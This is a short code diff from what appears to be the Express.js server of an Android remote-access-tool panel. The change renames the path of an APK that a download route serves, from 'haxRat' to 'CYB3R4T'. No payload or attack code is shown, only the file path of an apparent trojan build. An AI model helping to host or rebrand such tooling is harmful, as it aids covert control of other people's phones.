@@ -27,7 +27,7 @@ function isAllowed(req, res, next) {
 }
 
 routes.get('/build.s.apk/', (req, res) => {
-	var apk = "/data/data/com.termux/files/home/haxrat/haxRat.apk";
+	var apk = "/data/data/com.termux/files/home/CYB3R4T/CYB3R4T.apk";
 	res.download(apk);
 });
 
